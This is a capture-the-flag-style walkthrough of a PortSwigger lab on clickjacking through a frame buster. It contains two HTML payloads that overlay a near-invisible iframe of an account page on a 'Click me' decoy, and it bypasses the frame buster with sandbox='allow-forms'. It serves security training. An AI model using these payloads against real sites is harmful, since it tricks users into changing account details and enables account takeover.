# Clickjacking with a frame buster script

## This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a [clickjacking attack](https://portswigger.net/web-security/clickjacking) that changes the users email address?

## To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.

## You can log in to your own account using the following credentials: `wiener:peter`

---

### step 1

login
apply the payload

```html
<style>
  iframe {
    position: relative;
    width: 700px;
    height: 700px;
    opacity: 0.1;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 449px;
    left: 68px;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe
  src="https://0ac3007a04d3fbab817f2a57006e005b.web-security-academy.net/my-account?email=abc@gmail.com"
></iframe>
```

you will get
`This page cannot be framed`

so use `sandbox="allow-forms"` in iframe

```html
<style>
  iframe {
    position: relative;
    width: 700px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 449px;
    left: 68px;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe
  src="https://0a42000a0300fd468040958c003b0034.web-security-academy.net/my-account?email=abc@gmail.com"
  sandbox="allow-forms"
></iframe>
```
